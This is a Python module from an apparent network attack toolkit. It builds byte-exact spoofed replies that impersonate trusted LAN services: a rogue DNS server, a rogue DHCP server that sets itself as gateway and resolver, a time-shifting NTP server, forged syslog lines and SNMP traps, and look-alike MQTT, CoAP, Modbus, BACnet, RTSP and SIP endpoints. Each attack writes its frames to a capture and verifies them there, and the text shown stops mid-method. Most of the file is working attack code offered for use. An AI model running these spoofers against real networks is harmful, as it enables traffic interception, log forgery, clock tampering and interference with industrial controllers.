"""The IT hijackers: stand up a device the network already trusts and take its place.

Seventy attacks that answer *as* something else — a second DNS server, a rogue DHCP, a
look-alike MQTT broker, an ONVIF camera reporting another camera's identity, a Modbus
slave accepting writes meant for a PLC, a relay sitting in front of Redis, a printer
handing over its spool files.  Every one of them is a real protocol conversation:

* the request and the answer are assembled by :mod:`wifipilot.itproto` (or, where the
  protocol has no builder, by the small BER, DHCP and NTP writers at the top of this
  module),
* the device's own reply comes from :class:`wifipilot.itsim.VirtualLan` in demo mode —
  that is the identity being worn — and from the wire in a live run,
* the frames we would put on the LAN are written to a capture, and *read back out of
  it*, down to the protocol field that matters (a lease, a topic, a value, a device
  name), because a report that trusts the bytes it meant to write is a report that
  cannot fail.

The wave is graded in two halves on purpose.  The device half is what the network's own
host answered; the wire half is what our look-alike put on the link, decoded again by the
same codec that built it.
"""

from __future__ import annotations

import os
import struct
import tempfile
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Sequence, Tuple

from .. import itproto as proto
from .. import netproto as np
from ..itsim import LanHost, VirtualLan, demo_lan
from ..models import AccessPoint
from . import hijack75
from .base import Attack, AttackContext, AttackOutcome
from .survey3 import ALL

__all__ = ["ATTACKS", "META", "NAMES", "REGISTRY", "Peer", "ether_rows", "payloads"]

#: our address on the segment: locally administered, so it cannot be mistaken for a
#: vendor's and cannot collide with a device that shipped with a real OUI
OUR_MAC = "02:5a:5a:5a:5a:5a"
OUR_IP = "192.168.1.240"
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
BROADCAST_IP = "255.255.255.255"
MULTICAST_MAC = "01:00:5e:00:00:fb"                     # mDNS
SSDP_MAC = "01:00:5e:7f:ff:fa"
GATEWAY = "192.168.1.1"
#: the address a rogue DHCP server offers when it has not seen the real lease
ROGUE_LEASE = "192.168.1.101"
ETHERTYPE_IP = 0x0800
ETHERTYPE_ARP = 0x0806
IPPROTO_TCP = 6
IPPROTO_UDP = 17
#: the identity we wear when the network has to believe a name
OUR_NAME = "wp-service"


# --------------------------------------------------------------------------- #
# builders the protocol module does not carry
# --------------------------------------------------------------------------- #

def mac_bytes(mac: str) -> bytes:
    """``02:5a:..`` -> six octets."""
    return bytes(int(part, 16) for part in mac.split(":"))


def mac_text(raw: bytes) -> str:
    return ":".join(f"{octet:02x}" for octet in raw)


def ether(destination: str, source: str, payload: bytes,
          ethertype: int = ETHERTYPE_IP) -> bytes:
    """An Ethernet II frame: what a hijacker puts on the wire, minus the preamble."""
    return mac_bytes(destination) + mac_bytes(source) + struct.pack(">H", ethertype) + payload


def _ber_length(size: int) -> bytes:
    if size < 0x80:
        return bytes([size])
    if size < 0x100:
        return bytes([0x81, size])
    return bytes([0x82, size >> 8, size & 0xFF])


def _ber(tag: int, payload: bytes) -> bytes:
    return bytes([tag]) + _ber_length(len(payload)) + payload


def _ber_int(value: int) -> bytes:
    if value == 0:
        return _ber(0x02, b"\x00")
    octets = []
    while value:
        octets.insert(0, value & 0xFF)
        value >>= 8
    if octets[0] & 0x80:
        octets.insert(0, 0)
    return _ber(0x02, bytes(octets))


def _ber_text(value: str) -> bytes:
    return _ber(0x04, value.encode())


def _ber_oid(oid: str) -> bytes:
    return _ber(0x06, np.encode_oid(oid))


def _ber_ipv4(address: str) -> bytes:
    return _ber(0x40, np.ipv4_bytes(address))


def snmp_trap(agent: str, enterprise: str = "1.3.6.1.4.1.8072.2.3",
              generic: int = 2, specific: int = 1, uptime: int = 4321,
              oid: str = "1.3.6.1.2.1.1.3.0", value: int = 0,
              community: str = "public") -> bytes:
    """An SNMPv1 trap in another device's name: what a management station believes.

    The builders in :mod:`wifipilot.netproto` cover Get requests and responses; a trap is
    the direction that matters for a hijacker, because a trap is *unsolicited* — the
    station has no request of its own to compare it against.
    """
    varbind = _ber(0x30, _ber_oid(oid) + _ber_int(value))
    body = (_ber_oid(enterprise) + _ber_ipv4(agent) + _ber_int(generic)
            + _ber_int(specific) + _ber_int(uptime) + _ber(0x30, varbind))
    pdu = _ber(0xA4, body)
    return _ber(0x30, _ber_int(0) + _ber_text(community) + pdu)


def syslog_line(message: str, sender: str = OUR_IP, tag: str = "kernel",
                severity: int = 5, facility: int = 1, seq: int = 1) -> bytes:
    """An RFC 3164 syslog line: 34 characters a collector trusts for years."""
    stamp = time.strftime("%b %d %H:%M:%S")
    return (f"<{facility * 8 + severity}>{stamp} {sender} {tag}[{seq}]: {message}\n"
            ).encode()


def tftp_request(filename: str, write: bool = False, mode: str = "octet") -> bytes:
    """RRQ (1) or WRQ (2): the whole of TFTP's handshake, and its whole of security."""
    opcode = 2 if write else 1
    return struct.pack(">H", opcode) + filename.encode() + b"\x00" + mode.encode() + b"\x00"


def tftp_data(block: int, payload: bytes) -> bytes:
    return struct.pack(">HH", 3, block) + payload


def tftp_ack(block: int) -> bytes:
    return struct.pack(">HH", 4, block)


def tftp_error(code: int, message: str) -> bytes:
    return struct.pack(">HH", 5, code) + message.encode() + b"\x00"


def ntp_reply(seconds: int, stratum: int = 2, ref_id: bytes = b"GPS ",
              originate: bytes = b"\x00" * 8, microseconds: int = 0) -> bytes:
    """An NTPv4 server reply: 48 bytes that move every clock that asks for them.

    Layout, in order: flags, stratum, poll, precision, root delay, root dispersion,
    reference id, then four 64-bit timestamps (reference, originate, receive, transmit).
    The attack that matters is the *transmit* one — a host believes the first server
    that answers, and a clock that is wrong breaks TLS, Kerberos and log timelines.
    """
    stamp = struct.pack(">II", seconds, microseconds)
    return (struct.pack(">BBBB", 0x24, stratum, 6, -20 & 0xFF)
            + struct.pack(">I", 0x00010000)                       # root delay ~1 s
            + struct.pack(">I", 0x00001000)                       # root dispersion
            + ref_id.ljust(4, b" ")[:4]
            + stamp + originate + stamp + stamp)


def http_answer(status: int = 200, body: str = "",
                content_type: str = "text/html; charset=utf-8",
                headers: Sequence[Tuple[str, str]] = ()) -> bytes:
    """An HTTP response, built here so a look-alike page is byte-exact and readable."""
    reasons = {200: "OK", 301: "Moved Permanently", 302: "Found", 401: "Unauthorized",
               403: "Forbidden", 404: "Not Found", 500: "Internal Server Error"}
    raw = body.encode() if isinstance(body, str) else body
    head = [f"HTTP/1.1 {status} {reasons.get(status, 'OK')}",
            f"Content-Type: {content_type}", f"Content-Length: {len(raw)}",
            f"Server: {OUR_NAME}", "Connection: close"]
    head += [f"{key}: {value}" for key, value in headers]
    return ("\r\n".join(head) + "\r\n\r\n").encode() + raw


# --------------------------------------------------------------------------- #
# reading the capture back
# --------------------------------------------------------------------------- #

def ether_rows(path: str) -> List[Dict[str, Any]]:
    """Ethernet II frames out of a capture the attack wrote, radiotap already stripped."""
    rows: List[Dict[str, Any]] = []
    for _ts, buf, start, length in hijack75.iter_frames(str(path)):
        frame = bytes(buf[start:start + length])
        if len(frame) < 14:
            continue
        rows.append({"destination": mac_text(frame[0:6]), "source": mac_text(frame[6:12]),
                     "ethertype": int.from_bytes(frame[12:14], "big"),
                     "body": frame[14:]})
    return rows


def payloads(path: str, protocol: int = 0) -> List[Dict[str, Any]]:
    """The transport payload of every IPv4 datagram, with its ports.

    This is the reader that makes the wave's claim checkable: the *protocol* answer is
    parsed again out of the capture, so an attack that wrote the wrong bytes cannot report
    a lease or a topic it never sent.
    """
    out: List[Dict[str, Any]] = []
    for row in ether_rows(path):
        body = row["body"]
        if row["ethertype"] != ETHERTYPE_IP or len(body) < 20:
            continue
        ihl = (body[0] & 0x0F) * 4
        number = body[9]
        if protocol and number != protocol:
            continue
        transport = body[ihl:]
        entry: Dict[str, Any] = {"protocol": number,
                                 "src": ".".join(str(b) for b in body[12:16]),
                                 "dst": ".".join(str(b) for b in body[16:20]),
                                 "source_mac": row["source"],
                                 "destination_mac": row["destination"]}
        if number == IPPROTO_UDP and len(transport) >= 8:
            entry["src_port"], entry["dst_port"] = struct.unpack(">HH", transport[:4])
            entry["payload"] = transport[8:]
        elif number == IPPROTO_TCP and len(transport) >= 20:
            entry["src_port"], entry["dst_port"] = struct.unpack(">HH", transport[:4])
            entry["flags"] = transport[13]
            entry["payload"] = transport[(transport[12] >> 4) * 4:]
        else:
            entry["payload"] = transport
        out.append(entry)
    return out


# --------------------------------------------------------------------------- #
# the device being worn
# --------------------------------------------------------------------------- #

@dataclass
class Peer:
    """One host whose identity an attack wears: what it is, where it is, what it said."""

    ip: str
    mac: str = ""
    hostname: str = ""
    device: str = ""
    model: str = ""
    port: int = 0
    answer: bytes = b""
    parsed: Dict[str, Any] = field(default_factory=dict)
    host: Optional[LanHost] = None

    @property
    def label(self) -> str:
        name = self.hostname or self.ip
        return f"{name} ({self.ip})"

    def to_dict(self) -> Dict[str, Any]:
        return {"ip": self.ip, "hostname": self.hostname, "device": self.device,
                "model": self.model, "port": self.port, "mac": self.mac,
                "answered": bool(self.answer), "label": self.label}


class _ItHijack(Attack):
    """Answer as a device the network trusts, then read the exchange back out of the wire.

    Subclasses state three things: the service they speak (``protocol``/``port``/
    ``transport``), the request they send and the answer they return, and how to read the
    evidence out of the device's reply and out of the capture.  Everything else — finding
    hosts, the capture, the decode, the finding, the outcome — happens here, once.
    """

    #: the family defaults live in ``_FAMILY_AXES``; a class may still override them
    category = ""
    noise = ""
    impact = ""
    severity = "medium"
    requires = ()
    needs_injection = False
    applies_to = ALL
    domain = "it"
    default_enabled = False
    family = ""
    protocol = ""
    port = 0
    transport = "udp"
    source_port = 0
    devices: Tuple[str, ...] = ()
    #: how many hosts of the segment one run talks to
    max_targets = 3
    #: how many of those have to answer for the run to count as successful
    min_answers = 1
    #: send our answer to the broadcast address (DHCP, and anything else pre-address)
    broadcast = False

    def __init_subclass__(cls, **kwargs: Any) -> None:
        """Take the description from the class's own one-line docstring."""
        super().__init_subclass__(**kwargs)
        if not cls.__dict__.get("description"):
            first = (cls.__doc__ or "").strip().splitlines()
            if first and first[0].strip():
                cls.description = first[0].strip()

    # -- what it can talk to ------------------------------------------------ #
    def applies(self, ap: AccessPoint) -> bool:
        return True

    def available(self, ctx: AttackContext) -> bool:
        return True

    def unavailable_reason(self, ctx: AttackContext) -> str:
        return ""

    def lan(self) -> VirtualLan:
        return demo_lan()

    def peers(self, ctx: AttackContext) -> List[Peer]:
        """The hosts that carry this service, most-specific device type first."""
        hosts = [host for host in self.lan().hosts
                 if not self.port or self.port in host.ports]
        if self.devices:
            preferred = [host for host in hosts if host.device in self.devices]
            hosts = preferred or hosts
        if not hosts:
            hosts = list(self.lan().hosts)
        return [Peer(ip=host.ip, mac=host.mac, hostname=host.hostname, device=host.device,
                     model=host.model, port=self.port, host=host)
                for host in hosts[:self.max_targets]]

    def ask(self, ctx: AttackContext, peer: Peer, request: bytes) -> bytes:
        """The device's own answer: the identity this attack is about to wear."""
        if not request or peer.host is None:
            return b""
        return self.lan().respond(peer.host, self.port, request, self.protocol)

    # -- what it says ------------------------------------------------------- #
    def request(self, peer: Peer) -> bytes:
        """The request the network's own client would send."""
        return b""

    def reply(self, peer: Peer) -> bytes:
        """The answer our look-alike sends back, in the device's name."""
        return b""

    def parse(self, data: bytes) -> Dict[str, Any]:
        """Decode the device's answer with the protocol's own codec."""
        return {}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        """The fields of the device's answer that matter for this attack."""
        return {}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        """Read our own answer back out of the capture; ``{}`` means 'nothing to add'."""
        return {}

    # -- the wire ----------------------------------------------------------- #
    def frame(self, peer: Peer, payload: bytes) -> bytes:
        """The frame our look-alike would put on the link for this peer.

        A service whose clients have not got an address yet (DHCP) is answered to the
        broadcast address, which is why ``broadcast`` exists: the frame has to go
        somewhere every host on the segment already listens.
        """
        source_port = self.source_port or (1024 + (self.port or 1))
        destination_mac = BROADCAST_MAC if self.broadcast else (peer.mac or BROADCAST_MAC)
        destination_ip = BROADCAST_IP if self.broadcast else peer.ip
        if self.transport == "udp":
            packet = np.ipv4_udp_packet(OUR_IP, destination_ip, source_port, self.port, payload)
            return ether(destination_mac, OUR_MAC, packet)
        segment = hijack75._tcp_segment(OUR_IP, destination_ip, source_port, self.port,
                                        flags=0x18, sequence=0x1000, window=64240,
                                        payload=payload)
        packet = hijack75._ipv4_packet(OUR_IP, destination_ip, segment, IPPROTO_TCP)
        return ether(destination_mac, OUR_MAC, packet)

    # -- the run ------------------------------------------------------------ #
    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool,
            chosen_by=getattr(ap, "picked_by", "operator"),
            reason=getattr(ap, "pick_reason", ""))
        started = time.time()
        peers = self.peers(ctx)
        if not peers:
            reason = (f"no host on the segment carries {self.protocol or 'this service'}"
                      " (demo runs use the simulated network; live runs need a scan)")
            ctx.session.end_attempt(attempt, "skipped", reason)
            return AttackOutcome.skipped(reason, reason)

        frames: List[bytes] = []
        for peer in peers:
            if ctx.want_stop():
                break
            request = self.request(peer)
            peer.answer = self.ask(ctx, peer, request)
            peer.parsed = self.parse(peer.answer) if peer.answer else {}
            try:
                payload = self.reply(peer)
            except Exception as exc:                          # pragma: no cover - defensive
                detail = f"{self.name}: the look-alike answer could not be built: {exc}"
                ctx.session.end_attempt(attempt, "failed", detail)
                return AttackOutcome.failed(detail, detail)
            if payload:
                frames.append(self.frame(peer, payload))

        decoded: Dict[str, Any] = {"rows": [], "payloads": [], "census": {}}
        path = ""
        if frames:
            path = os.path.join(tempfile.gettempdir(), f"wifipilot-{self.name}.pcap")
            hijack75.write_capture(path, frames, signal=-30)
            decoded = {"rows": ether_rows(path), "payloads": payloads(path),
                       "census": hijack75.frame_census(path), "path": path}
        answered = [peer for peer in peers if peer.answer]
        headline, detail, extra = self.interpret(ctx, peers, decoded)
        extra.update({"family": self.family, "protocol": self.protocol, "port": self.port,
                      "peers": [peer.to_dict() for peer in peers],
                      "answers": len(answered), "frames": len(frames),
                      "packets": len(decoded.get("payloads") or []),
                      "domain": "it", "simulated": bool(ctx.demo),
                      "seconds": round(time.time() - started, 2)})
        for peer in peers:
            if peer.parsed:
                extra.setdefault("device_answers", []).append(
                    {"host": peer.label, "fields": self.evidence(peer.parsed, peer)})
        extra.update(self.confirm(decoded, peers))

        ok = len(answered) >= self.min_answers and bool(extra.get("confirmed", True))
        if ok:
            self.finding(ctx, ap, headline, detail, severity=self.severity, kind=self.name)
        ctx.session.end_attempt(attempt, "success" if ok else "failed", headline, detail)
        if ok:
            return AttackOutcome.success(headline, detail=detail, extra=extra)
        return AttackOutcome.failed(headline, detail=detail, extra=extra)

    # -- the report --------------------------------------------------------- #
    def interpret(self, ctx: AttackContext, peers: List[Peer],
                  decoded: Dict[str, Any]) -> Tuple[str, str, Dict[str, Any]]:
        """What to say: the default reads the two halves and states both."""
        answered = [peer for peer in peers if peer.answer]
        # a frame that is not IPv4 (an ARP reply, a bare Ethernet frame) is still a frame
        # we put on the link, and the report has to count it
        heard = len(decoded.get("payloads") or []) or len(decoded.get("rows") or [])
        if answered:
            headline = (f"{self.label}: {len(answered)} of {len(peers)} device(s) answered, "
                        f"our look-alike is in {heard} packet(s)")
        else:
            headline = (f"{self.label}: we answered as the service ourselves, "
                        f"{heard} packet(s) in the capture")
        names = ", ".join(peer.label for peer in peers[:4])
        asked = "; ".join(self.evidence(peer.parsed, peer).get("line", "")
                          for peer in answered[:2] if peer.parsed) or "no fields read"
        detail = (f"talked to {names}; the devices' own answers said: {asked}.  Our replies "
                  f"are in the capture and decode again as {heard} IP packet(s)"
                  + (" (simulated: the segment is the demo network)" if ctx.demo else ""))
        extra = {"headline": headline, "heard": heard}
        return headline, detail, extra


# the families are appended below: mimic, impersonate, hijack, poison, relay, steal


# --------------------------------------------------------------------------- #
# mimic: stand up the same service, in the network's own name
# --------------------------------------------------------------------------- #

class ItMimicDnsAttack(_ItHijack):
    """A second DNS server: answer the query before the real resolver does."""

    name = "it_mimic_dns"
    label = "Rogue DNS server (answers in the resolver's name)"
    tool = "wifipilot netproto.py (dns_response) + a UDP socket on 53"
    family = "mimic"
    protocol = "dns"
    port = 53
    transport = "udp"
    source_port = 53
    devices = ("router", "domain_controller", "modem_ont")
    min_answers = 0
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return np.dns_query(f"{peer.hostname or 'lan'}.local", qtype=1, txid=0x5150)

    def reply(self, peer: Peer) -> bytes:
        name = f"{peer.hostname or 'lan'}.local"
        return np.dns_response(self.request(peer), [(name, OUR_IP)], ttl=30)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return np.parse_dns(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        answers = parsed.get("answers") or []
        return {"answers": answers, "line": f"{len(answers)} record(s) in its own answer"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 53]
        answered = np.parse_dns(rows[0]["payload"]) if rows else {}
        records = answered.get("answers") or []
        return {"confirmed": bool(records), "rogue_records": records,
                "rogue_server": rows[0]["src"] if rows else ""}


class ItMimicDhcpAttack(_ItHijack):
    """A rogue DHCP server: hand out a lease whose gateway is us."""

    name = "it_mimic_dhcp"
    label = "Rogue DHCP server (hands out our own gateway)"
    tool = "wifipilot netproto.py (dhcp_offer) + a UDP socket on 67"
    family = "mimic"
    protocol = "dhcp"
    port = 68
    transport = "udp"
    source_port = 67
    devices = ("router", "modem_ont", "switch", "vpn_gateway", "firewall")
    min_answers = 0
    severity = "critical"
    broadcast = True

    def request(self, peer: Peer) -> bytes:
        return np.dhcp_discover(OUR_MAC, hostname=OUR_NAME)

    def reply(self, peer: Peer) -> bytes:
        return np.dhcp_offer(OUR_MAC, "192.168.1.99", OUR_IP, OUR_IP,
                             dns=[OUR_IP], lease=86400, hostname=OUR_NAME)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return np.parse_dhcp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"offered": parsed.get("yiaddr", ""), "server": parsed.get("server_id", ""),
                "line": f"the real server offers {parsed.get('yiaddr', '?')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 68]
        offer = np.parse_dhcp(rows[0]["payload"]) if rows else {}
        options = offer.get("options") or {}
        return {"confirmed": bool(offer),
                "rogue_lease": {"address": offer.get("yiaddr", ""),
                                "server": offer.get("server_id", ""),
                                "router": options.get("router", ""),
                                "dns": options.get("dns", "")},
                "lease_goes_to": OUR_IP}


class ItMimicNtpAttack(_ItHijack):
    """A rogue time server: answer first, and every clock in the building follows."""

    name = "it_mimic_ntp"
    label = "Rogue NTP server (moves the network's clocks)"
    tool = "wifipilot ithijack.ntp_reply + a UDP socket on 123"
    family = "mimic"
    protocol = "ntp"
    port = 123
    transport = "udp"
    source_port = 123
    devices = ("router", "hypervisor_host", "domain_controller", "linux_server")
    min_answers = 0
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.ntp_client(version=4)

    def reply(self, peer: Peer) -> bytes:
        # 2026-01-01 00:00:00 UTC: a plausible-looking but wrong wall clock
        return ntp_reply(1_767_225_600, stratum=1, ref_id=b"GPS ")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_ntp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"stratum": parsed.get("stratum"), "version": parsed.get("version"),
                "line": f"stratum {parsed.get('stratum', '?')} on the wire"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 123]
        payload = rows[0]["payload"] if rows else b""
        seconds = struct.unpack(">I", payload[40:44])[0] if len(payload) == 48 else 0
        return {"confirmed": seconds == 1_767_225_600,
                "served_time": time.strftime("%Y-%m-%d %H:%M:%SZ", time.gmtime(seconds))
                if seconds else "", "stratum": payload[1] if payload else 0,
                "server": rows[0]["src"] if rows else ""}


class ItMimicSyslogAttack(_ItHijack):
    """A second syslog sender: file forged events in a device's name."""

    name = "it_mimic_syslog"
    label = "Forged syslog in another device's name"
    tool = "wifipilot ithijack.syslog_line + UDP 514"
    family = "mimic"
    protocol = "syslog"
    port = 514
    transport = "udp"
    source_port = 514
    devices = ("router", "switch", "firewall", "domain_controller", "linux_server")
    min_answers = 0
    severity = "medium"

    def target_host(self, peer: Peer) -> str:
        return peer.ip

    def reply(self, peer: Peer) -> bytes:
        """The syslog lines a collector would file, in the device's own name."""
        return syslog_line("kernel panic - not syncing: watchdog", sender=peer.ip,
                           tag="kernel", severity=0, seq=1)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return {}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"line": "the device itself sends no syslog we can read in demo mode"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        lines = [row["payload"].decode(errors="replace").strip()
                 for row in decoded.get("payloads") or [] if row.get("dst_port") == 514]
        return {"confirmed": bool(lines), "forged_lines": len(lines),
                "first_line": lines[0] if lines else "",
                "sender_spoofed": peers[0].ip if peers else ""}


class ItMimicMqttAttack(_ItHijack):
    """A look-alike MQTT broker: accept the clients the real broker would refuse."""

    name = "it_mimic_mqtt"
    label = "Rogue MQTT broker at the network's own address"
    tool = "wifipilot itproto.py (mqtt_connect) + a TCP listener on 1883"
    family = "mimic"
    protocol = "mqtt"
    port = 1883
    transport = "tcp"
    source_port = 1883
    devices = ("gateway_hub", "sensor", "smart_plug", "smart_lock", "thermostat")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.mqtt_connect(client_id=OUR_NAME, username="wp", password="wp")

    def reply(self, peer: Peer) -> bytes:
        return bytes([0x20, 0x02, 0x00, 0x00])          # CONNACK, session present, accepted

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_mqtt(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"packet": parsed.get("packet") or parsed.get("type"),
                "line": f"it answered {parsed.get('packet') or parsed.get('type') or 'MQTT'}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 1883]
        connack = proto.parse_mqtt(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(rows) and bool(connack),
                "rogue_connack": connack.get("packet") or connack.get("type") or "",
                "accepted": (rows[0]["payload"][3] if rows and len(rows[0]["payload"]) > 3 else None)}


class ItMimicCoapAttack(_ItHijack):
    """A look-alike CoAP endpoint on the sensor network's own port."""

    name = "it_mimic_coap"
    label = "Rogue CoAP endpoint (answers the sensor gateway)"
    tool = "wifipilot itproto.py (coap_packet) + UDP 5683"
    family = "mimic"
    protocol = "coap"
    port = 5683
    transport = "udp"
    source_port = 5683
    devices = ("sensor", "gateway_hub", "smart_plug", "energy_meter")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.coap_packet(code=1, uri="/status", message_id=0x1234)

    def reply(self, peer: Peer) -> bytes:
        return proto.coap_packet(code=69, uri="/status", message_id=0x1234,
                                 payload=b'{"temp":21.5,"armed":false}', content_format=50)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_coap(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"code": parsed.get("code"), "uri": parsed.get("uri"),
                "line": f"it answered {parsed.get('code')} for {parsed.get('uri')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5683]
        answer = proto.parse_coap(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(answer), "rogue_code": answer.get("code"),
                "rogue_payload": (answer.get("payload") or b"").decode(errors="replace")}


class ItMimicModbusAttack(_ItHijack):
    """A look-alike Modbus slave: accept the writes meant for the PLC."""

    name = "it_mimic_modbus"
    label = "Rogue Modbus slave (accepts writes meant for the PLC)"
    tool = "wifipilot itproto.py (modbus_request) + TCP 502"
    family = "mimic"
    protocol = "modbus"
    port = 502
    transport = "tcp"
    source_port = 502
    devices = ("plc", "rtu", "hmi_panel", "energy_meter", "ev_charger")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.modbus_request(3, unit=1, address=0, count=4, transaction=0x10)

    def reply(self, peer: Peer) -> bytes:
        return proto.modbus_request(3, unit=1, address=0, count=4, transaction=0x10,
                                    payload=struct.pack(">BB", 8, 8) + bytes(range(8)))

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_modbus(data, request=False)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"function": parsed.get("function"), "unit": parsed.get("unit"),
                "line": f"unit {parsed.get('unit')} answers function {parsed.get('function')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 502]
        answer = proto.parse_modbus(rows[0]["payload"], request=False) if rows else {}
        return {"confirmed": bool(answer), "rogue_function": answer.get("function"),
                "rogue_unit": answer.get("unit"), "registers": answer.get("values", [])}


class ItMimicBacnetAttack(_ItHijack):
    """A look-alike BACnet device inside the building's own device range."""

    name = "it_mimic_bacnet"
    label = "Rogue BACnet device (sits in the building's device range)"
    tool = "wifipilot itproto.py (bacnet_who_is) + UDP 47808"
    family = "mimic"
    protocol = "bacnet"
    port = 47808
    transport = "udp"
    source_port = 47808
    devices = ("building_controller", "hvac", "thermostat", "energy_meter")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.bacnet_who_is(0, 4194303)

    def reply(self, peer: Peer) -> bytes:
        return proto.bacnet_read_property(device=2001, obj_type=8, instance=2001, prop=77)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_bacnet(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"service": parsed.get("service"), "device": parsed.get("device"),
                "line": f"it answered {parsed.get('service')} as device {parsed.get('device')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 47808]
        answer = proto.parse_bacnet(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(answer), "rogue_device": answer.get("device"),
                "rogue_service": answer.get("service")}


class ItMimicRtspAttack(_ItHijack):
    """A look-alike camera stream: the clients that ask for it get our picture."""

    name = "it_mimic_rtsp"
    label = "Rogue RTSP camera (answers a stream request in the camera's name)"
    tool = "wifipilot itproto.py (rtsp_request) + TCP 554"
    family = "mimic"
    protocol = "rtsp"
    port = 554
    transport = "tcp"
    source_port = 554
    devices = ("ip_camera", "nvr_dvr", "camera_doorbell")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.rtsp_request("DESCRIBE", url=f"rtsp://{peer.ip}/stream1", cseq=1)

    def reply(self, peer: Peer) -> bytes:
        body = ("v=0\r\no=- 1 1 IN IP4 " + OUR_IP
                + "\r\ns=wifipilot\r\nt=0 0\r\nm=video 0 RTP/AVP 96\r\n")
        return (f"RTSP/1.0 200 OK\r\nCSeq: 1\r\nContent-Type: application/sdp\r\n"
                f"Content-Length: {len(body)}\r\nServer: {OUR_NAME}\r\n\r\n"
                ).encode() + body.encode()

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_rtsp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "server": parsed.get("server"),
                "line": f"it answered {parsed.get('status', '?')} as {parsed.get('server', '?')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 554]
        answer = proto.parse_rtsp(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(answer), "rogue_status": answer.get("status"),
                "rogue_sdp": "wifipilot" in (rows[0]["payload"].decode(errors="replace")
                                             if rows else "")}


class ItMimicSipAttack(_ItHijack):
    """A look-alike registrar: the phones that find it register with us."""

    name = "it_mimic_sip"
    label = "Rogue SIP registrar (phones register through it)"
    tool = "wifipilot itproto.py (sip_register) + UDP 5060"
    family = "mimic"
    protocol = "sip"
    port = 5060
    transport = "udp"
    source_port = 5060
    devices = ("voip_phone", "pbx", "doorbell", "video_conference")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.sip_register(f"sip:{peer.ip}", user="100", expires=120)

    def reply(self, peer: Peer) -> bytes:
        body = ("SIP/2.0 200 OK\r\n"
                "Via: SIP/2.0/UDP " + OUR_IP + ";branch=z9hG4bKwp\r\n"
                "To: <sip:100@" + peer.ip + ">;tag=wp\r\n"
                "From: <sip:100@" + peer.ip + ">;tag=wp\r\n"
                "Call-ID: wifipilot@" + OUR_IP + "\r\nCSeq: 1 REGISTER\r\n"
                "Contact: <sip:100@" + OUR_IP + ":5060>\r\n"
                f"Server: {OUR_NAME}\r\nContent-Length: 0\r\n\r\n")
        return body.encode()

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_sip(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "method": parsed.get("method"),
                "line": f"it answered {parsed.get('status', '?')} to {parsed.get('method', '?')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5060]
        answer = proto.parse_sip(rows[0]["payload"]) if rows else {}
